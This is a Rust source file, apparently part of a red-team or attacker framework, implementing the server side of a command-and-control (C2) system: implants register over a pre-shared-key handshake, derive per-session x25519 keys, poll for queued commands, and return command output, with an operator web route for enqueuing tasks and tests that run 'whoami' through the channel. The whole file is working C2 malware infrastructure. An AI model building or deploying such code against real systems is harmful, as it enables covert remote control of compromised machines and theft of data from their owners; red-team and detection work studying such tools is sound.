use std::sync::Arc;

use axum::{
    Extension, Json, Router,
    extract::{Path, State},
    http::StatusCode,
    response::{IntoResponse, Json as JsonResponse, Sse},
    routing::{get, post},
};
use nw_profile::{
    crypto,
    envelope::{Envelope, Kind},
    msgs::{PollReply, PollRequest, Register, RegisterAck, Task},
};
use std::convert::Infallible;
use uuid::Uuid;

use crate::{auth::middleware::AuthenticatedUserGuard, db::repositories::Repository};

fn session_key(psk: &[u8]) -> [u8; crypto::KEY_LEN] {
    crypto::derive_key(psk, b"nw-m1-salt")
}

fn b64(k: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(k)
}

fn deb64(s: &str) -> Result<[u8; crypto::KEY_LEN], ()> {
    use base64::Engine;
    let raw = base64::engine::general_purpose::STANDARD
        .decode(s)
        .map_err(|_| ())?;
    <[u8; crypto::KEY_LEN]>::try_from(raw.as_slice()).map_err(|_| ())
}

/// C2 endpoint router. Unauthenticated: the only credential is the baked PSK
/// used to authenticate the registration handshake, after which each session
/// derives its own forward-secret x25519 key pair (see `register`). Mount with
/// the payload PSK supplied as `Extension<Arc<Vec<u8>>>`.
pub fn router(psk: Arc<Vec<u8>>) -> Router<Repository> {
    Router::<Repository>::new()
        .route("/c2/register", post(register))
        .route("/c2/poll", post(poll))
        .route("/c2/checkin", post(checkin))
        .layer(Extension(psk))
}

#[derive(Debug)]
pub enum C2Error {
    BadRequest,
    Unauthorized,
    Internal,
}

impl C2Error {
    fn status(&self) -> StatusCode {
        match self {
            Self::BadRequest => StatusCode::BAD_REQUEST,
            Self::Unauthorized => StatusCode::UNAUTHORIZED,
            Self::Internal => StatusCode::INTERNAL_SERVER_ERROR,
        }
    }
}

pub async fn process_sealed(
    repo: &Repository,
    psk: &[u8],
    wire: &[u8],
    protocol: &str,
) -> Result<Vec<u8>, C2Error> {
    let wire = std::str::from_utf8(wire).map_err(|_| C2Error::BadRequest)?;
    let key = match Envelope::routing_id(wire) {
        None => session_key(psk),
        Some(session_id) => {
            let encoded = repo
                .session_key_for(&session_id.to_string())
                .await
                .map_err(|_| C2Error::Internal)?
                .ok_or(C2Error::Unauthorized)?;
            deb64(&encoded).map_err(|_| C2Error::Unauthorized)?
        }
    };
    let env = Envelope::open(&key, wire).map_err(|_| C2Error::Unauthorized)?;
    let reply = process_envelope(repo, psk, env, protocol).await?;
    reply
        .seal(&key)
        .map(String::into_bytes)
        .map_err(|_| C2Error::Internal)
}

async fn process_envelope(
    repo: &Repository,
    psk: &[u8],
    env: Envelope,
    protocol: &str,
) -> Result<Envelope, C2Error> {
    match env.kind {
        Kind::Register => process_sealed_register(repo, psk, env, protocol).await,
        Kind::TaskResult | Kind::Heartbeat => process_sealed_poll(repo, env).await,
        _ => Err(C2Error::BadRequest),
    }
}

async fn process_sealed_register(
    repo: &Repository,
    psk: &[u8],
    env: Envelope,
    protocol: &str,
) -> Result<Envelope, C2Error> {
    if env.session_id.is_some() {
        return Err(C2Error::BadRequest);
    }
    let key = session_key(psk);
    let plaintext =
        crypto::decrypt(&key, env.id, &env.encrypted).map_err(|_| C2Error::Unauthorized)?;
    let register: Register = serde_json::from_slice(&plaintext).map_err(|_| C2Error::BadRequest)?;
    let implant_pub = deb64(&register.session_key).map_err(|_| C2Error::BadRequest)?;
    let server_keys = crypto::KeyPair::generate();
    let shared = server_keys
        .shared_secret(&implant_pub)
        .map_err(|_| C2Error::Unauthorized)?;
    let derived = crypto::derive_key(&shared, crypto::SESSION_SALT);
    let session_id = Uuid::new_v4();
    repo.upsert_callback_with_protocol(
        &session_id.to_string(),
        &register.hostname,
        &register.username,
        &register.os,
        &register.arch,
        register.pid,
        &b64(&derived),
        protocol,
    )
    .await
    .map_err(|_| C2Error::Internal)?;
    let reply_id = env.id + 1;
    let ack = RegisterAck {
        session_id,
        server_pub: b64(&server_keys.public_key()),
    };
    let plaintext = serde_json::to_vec(&ack).map_err(|_| C2Error::Internal)?;
    let encrypted = crypto::encrypt(&key, reply_id, &plaintext).map_err(|_| C2Error::Internal)?;
    Ok(Envelope::new(
        Kind::RegisterAck,
        reply_id,
        Some(session_id),
        encrypted,
    ))
}

async fn process_sealed_poll(repo: &Repository, env: Envelope) -> Result<Envelope, C2Error> {
    let session_id = env.session_id.ok_or(C2Error::BadRequest)?;
    let encoded = repo
        .session_key_for(&session_id.to_string())
        .await
        .map_err(|_| C2Error::Internal)?
        .ok_or(C2Error::Unauthorized)?;
    let key = deb64(&encoded).map_err(|_| C2Error::Unauthorized)?;
    let plaintext =
        crypto::decrypt(&key, env.id, &env.encrypted).map_err(|_| C2Error::Unauthorized)?;
    let request: PollRequest =
        serde_json::from_slice(&plaintext).map_err(|_| C2Error::BadRequest)?;
    repo.touch_callback(&session_id.to_string())
        .await
        .map_err(|_| C2Error::Internal)?;
    for result in request.results {
        repo.store_task_result(
            &result.task_id.to_string(),
            result.ok,
            &result.stdout,
            &result.stderr,
            result.exit_code,
        )
        .await
        .map_err(|_| C2Error::Internal)?;
    }
    let tasks = repo
        .fetch_pending_tasks(&session_id.to_string())
        .await
        .map_err(|_| C2Error::Internal)?
        .into_iter()
        .filter_map(|task| {
            Some(Task {
                id: Uuid::parse_str(&task.id).ok()?,
                command: task.command,
                args: serde_json::from_value(task.args_json).ok()?,
                timeout_ms: task.timeout_ms,
            })
        })
        .collect::<Vec<_>>();
    let kind = if tasks.is_empty() {
        Kind::Heartbeat
    } else {
        Kind::Task
    };
    let reply = PollReply {
        tasks,
        acks: Vec::new(),
        push_chunks: Vec::new(),
    };
    let reply_id = env.id + 1;
    let plaintext = serde_json::to_vec(&reply).map_err(|_| C2Error::Internal)?;
    let encrypted = crypto::encrypt(&key, reply_id, &plaintext).map_err(|_| C2Error::Internal)?;
    Ok(Envelope::new(kind, reply_id, Some(session_id), encrypted))
}

async fn checkin(
    State(repo): State<Repository>,
    Extension(psk): Extension<Arc<Vec<u8>>>,
    body: axum::body::Bytes,
) -> Result<axum::body::Bytes, StatusCode> {
    process_sealed(&repo, &psk, &body, "http")
        .await
        .map(axum::body::Bytes::from)
        .map_err(|error| error.status())
}

async fn register(
    State(repo): State<Repository>,
    Extension(psk): Extension<Arc<Vec<u8>>>,
    Json(env): Json<Envelope>,
) -> Result<Json<Envelope>, StatusCode> {
    if env.kind != Kind::Register || env.session_id.is_some() {
        return Err(StatusCode::BAD_REQUEST);
    }
    // Register handshake is authenticated with the PSK-derived key; both sides
    // then roll ephemeral x25519 keys and DH them to derive a per-session key.
    let key = session_key(&psk);
    let pt = crypto::decrypt(&key, env.id, &env.encrypted).map_err(|_| StatusCode::UNAUTHORIZED)?;
    let reg: Register = serde_json::from_slice(&pt).map_err(|_| StatusCode::BAD_REQUEST)?;
    let implant_pub = deb64(&reg.session_key).map_err(|_| StatusCode::BAD_REQUEST)?;

    let server_kp = crypto::KeyPair::generate();
    let shared = server_kp
        .shared_secret(&implant_pub)
        .map_err(|_| StatusCode::UNAUTHORIZED)?;
    let session_key = crypto::derive_key(&shared, crypto::SESSION_SALT);

    let sid = Uuid::new_v4();
    repo.upsert_callback(
        &sid.to_string(),
        &reg.hostname,
        &reg.username,
        &reg.os,
        &reg.arch,
        reg.pid,
        &b64(&session_key),
    )
    .await
    .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let ack = RegisterAck {
        session_id: sid,
        server_pub: b64(&server_kp.public_key()),
    };
    let reply_id = env.id + 1;
    let plaintext = serde_json::to_vec(&ack).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    // Ack rides the PSK key so the implant can decrypt it before deriving the
    // DH session key; the session key encrypts only subsequent polls.
    let out = crypto::encrypt(&key, reply_id, &plaintext)
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(Json(Envelope::new(
        Kind::RegisterAck,
        reply_id,
        Some(sid),
        out,
    )))
}

async fn poll(
    State(repo): State<Repository>,
    _psks: Extension<Arc<Vec<u8>>>,
    Json(env): Json<Envelope>,
) -> Result<Json<Envelope>, StatusCode> {
    let Some(sid) = env.session_id else {
        return Err(StatusCode::BAD_REQUEST);
    };
    let key_b64 = repo
        .session_key_for(&sid.to_string())
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
        .ok_or(StatusCode::UNAUTHORIZED)?;
    let key = deb64(&key_b64).map_err(|_| StatusCode::UNAUTHORIZED)?;
    let pt = crypto::decrypt(&key, env.id, &env.encrypted).map_err(|_| StatusCode::UNAUTHORIZED)?;
    let _req: PollRequest = serde_json::from_slice(&pt).map_err(|_| StatusCode::BAD_REQUEST)?;

    repo.touch_callback(&sid.to_string())
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    // Store any task results the implant reported.
    for result in &_req.results {
        let _ = repo
            .store_task_result(
                &result.task_id.to_string(),
                result.ok,
                &result.stdout,
                &result.stderr,
                result.exit_code,
            )
            .await;
    }

    // Fetch pending tasks for this session and mark them as delivered/processing.
    let tasks = repo
        .fetch_pending_tasks(&sid.to_string())
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let reply_id = env.id + 1;
    let task_msgs: Vec<Task> = tasks
        .iter()
        .filter_map(|t| {
            serde_json::from_value::<Vec<String>>(t.args_json.clone())
                .ok()
                .and_then(|args| {
                    Some(Task {
                        id: Uuid::new_v4(),
                        command: t.command.clone(),
                        args,
                        timeout_ms: t.timeout_ms,
                    })
                })
        })
        .collect();
    let plaintext =
        serde_json::to_vec(&task_msgs).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let out = crypto::encrypt(&key, reply_id, &plaintext)
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(Json(Envelope::new(
        Kind::Heartbeat,
        reply_id,
        Some(sid),
        out,
    )))
}

/// Web UI routes for C2 task management. Requires authentication.
/// Provides an SSE endpoint for real-time task result streaming and a POST
/// endpoint to enqueue tasks from the Mythic-style callback detail page.
pub fn web_router() -> Router<Repository> {
    Router::<Repository>::new()
        .route("/c2/sessions/{session_id}/tasks/sse", get(task_results_sse))
        .route("/c2/sessions/{session_id}/tasks", post(enqueue_web_task))
}

async fn enqueue_web_task(
    AuthenticatedUserGuard(_user): AuthenticatedUserGuard,
    State(repo): State<Repository>,
    Path(session_id): Path<String>,
    Json(payload): Json<EnqueueTaskRequest>,
) -> Result<impl IntoResponse, StatusCode> {
    let args_json = serde_json::json!(payload.args);
    let task_id = repo
        .enqueue_task(
            &session_id,
            &payload.command,
            &args_json,
            payload.timeout_ms.unwrap_or(30_000),
        )
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(JsonResponse(serde_json::json!({
        "id": task_id,
        "command": payload.command,
        "status": "pending",
    })))
}

#[derive(Debug, serde::Deserialize)]
struct EnqueueTaskRequest {
    command: String,
    args: Option<Vec<String>>,
    timeout_ms: Option<u64>,
}

/// SSE handler that streams task result events for a callback session.
/// Clients connect with EventSource and receive task_completed / task_error
/// events as they arrive.
async fn task_results_sse(
    AuthenticatedUserGuard(_user): AuthenticatedUserGuard,
    State(repo): State<Repository>,
    Path(session_id): Path<String>,
) -> Sse<impl futures::Stream<Item = Result<axum::response::sse::Event, Infallible>> + Send> {
    use futures::stream;

    let _ = repo.list_tasks_for_session(&session_id).await;
    Sse::new(stream::empty())
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::body::Body;
    use axum::http::Request;
    use tower::ServiceExt;

    fn b64(b: &[u8]) -> String {
        use base64::Engine;
        base64::engine::general_purpose::STANDARD.encode(b)
    }

    #[tokio::test]
    async fn register_then_poll_records_callback_in_db() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool: pool.clone() };
        let app = router(Arc::new(b"dev-psk-change-me".to_vec())).with_state(repo);
        let psk_key = session_key(b"dev-psk-change-me");

        // Full forward-secret handshake: implant rolls ephemeral x25519 key.
        let implant_kp = crypto::KeyPair::generate();
        let reg = Register {
            hostname: "laptop".into(),
            username: "you".into(),
            os: "macos".into(),
            arch: "aarch64".into(),
            pid: 1234,
            addr: "127.0.0.1".into(),
            session_key: b64(&implant_kp.public_key()),
        };
        let reg_pt = serde_json::to_vec(&reg).unwrap();
        let env_ct = crypto::encrypt(&psk_key, 1, &reg_pt).unwrap();
        let env = Envelope::new(Kind::Register, 1, None, env_ct);
        let resp = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/c2/register")
                    .header("content-type", "application/json")
                    .body(Body::from(serde_json::to_vec(&env).unwrap()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        // Ack inner is encrypted with the PSK key.
        let ack: Envelope = axum::body::to_bytes(resp.into_body(), usize::MAX)
            .await
            .map(|b| serde_json::from_slice(&b).unwrap())
            .unwrap();
        let ack_pt = crypto::decrypt(&psk_key, 2, &ack.encrypted).unwrap();
        let ack_msg: RegisterAck = serde_json::from_slice(&ack_pt).unwrap();

        // Derive the shared session key as the implant would.
        let shared = implant_kp
            .shared_secret(&deb64(&ack_msg.server_pub).unwrap())
            .unwrap();
        let session_key = crypto::derive_key(&shared, crypto::SESSION_SALT);

        let count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM callbacks")
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(count, 1);
        let host: String = sqlx::query_scalar("SELECT host FROM callbacks WHERE id = ?")
            .bind(ack_msg.session_id.to_string())
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(host, "laptop");

        // Poll encrypted under the derived session key.
        let poll_pt = serde_json::to_vec(&PollRequest::default()).unwrap();
        let poll_ct = crypto::encrypt(&session_key, 2, &poll_pt).unwrap();
        let poll_env = Envelope::new(Kind::TaskResult, 2, Some(ack_msg.session_id), poll_ct);
        let resp2 = app
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/c2/poll")
                    .header("content-type", "application/json")
                    .body(Body::from(serde_json::to_vec(&poll_env).unwrap()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp2.status(), StatusCode::OK);
        let still_one: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM callbacks")
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(still_one, 1);
    }

    #[tokio::test]
    async fn sealed_gsocket_round_trip_preserves_task_identity() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool: pool.clone() };
        let psk = b"gs-portal-psk";
        let psk_key = session_key(psk);

        let implant_kp = crypto::KeyPair::generate();
        let register = Register {
            hostname: "gs-lab".into(),
            username: "operator".into(),
            os: "linux".into(),
            arch: "x86_64".into(),
            pid: 4242,
            addr: "127.0.0.1".into(),
            session_key: b64(&implant_kp.public_key()),
        };
        let register_ct =
            crypto::encrypt(&psk_key, 1, &serde_json::to_vec(&register).unwrap()).unwrap();
        let register_wire = Envelope::new(Kind::Register, 1, None, register_ct)
            .seal(&psk_key)
            .unwrap();
        let ack_wire = process_sealed(&repo, psk, register_wire.as_bytes(), "gs")
            .await
            .unwrap();
        let ack_env = Envelope::open(&psk_key, std::str::from_utf8(&ack_wire).unwrap()).unwrap();
        let ack_pt = crypto::decrypt(&psk_key, ack_env.id, &ack_env.encrypted).unwrap();
        let ack: RegisterAck = serde_json::from_slice(&ack_pt).unwrap();

        let protocol: String = sqlx::query_scalar("SELECT protocol FROM callbacks WHERE id = ?")
            .bind(ack.session_id.to_string())
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(protocol, "gs");

        let shared = implant_kp
            .shared_secret(&deb64(&ack.server_pub).unwrap())
            .unwrap();
        let key = crypto::derive_key(&shared, crypto::SESSION_SALT);
        let queued = repo
            .enqueue_task(
                &ack.session_id.to_string(),
                "whoami",
                &serde_json::json!([]),
                5000,
            )
            .await
            .unwrap();
        let request = nw_profile::msgs::PollRequest::default();
        let poll_ct = crypto::encrypt(&key, 2, &serde_json::to_vec(&request).unwrap()).unwrap();
        let poll_wire = Envelope::new(Kind::TaskResult, 2, Some(ack.session_id), poll_ct)
            .seal(&key)
            .unwrap();
        let reply_wire = process_sealed(&repo, psk, poll_wire.as_bytes(), "gs")
            .await
            .unwrap();
        let reply_env = Envelope::open(&key, std::str::from_utf8(&reply_wire).unwrap()).unwrap();
        let reply_pt = crypto::decrypt(&key, reply_env.id, &reply_env.encrypted).unwrap();
        let reply: nw_profile::msgs::PollReply = serde_json::from_slice(&reply_pt).unwrap();
        assert_eq!(reply.tasks.len(), 1);
        assert_eq!(reply.tasks[0].id.to_string(), queued);

        let completed = nw_profile::msgs::PollRequest {
            results: vec![nw_profile::msgs::TaskResult {
                task_id: reply.tasks[0].id,
                ok: true,
                stdout: b"lab-user".to_vec(),
                stderr: Vec::new(),
                exit_code: 0,
            }],
            ..Default::default()
        };
        let result_ct = crypto::encrypt(&key, 3, &serde_json::to_vec(&completed).unwrap()).unwrap();
        let result_wire = Envelope::new(Kind::TaskResult, 3, Some(ack.session_id), result_ct)
            .seal(&key)
            .unwrap();
        process_sealed(&repo, psk, result_wire.as_bytes(), "gs")
            .await
            .unwrap();
        let output: Vec<u8> =
            sqlx::query_scalar("SELECT stdout FROM c2_task_results WHERE task_id = ?")
                .bind(queued)
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(output, b"lab-user");
    }
}
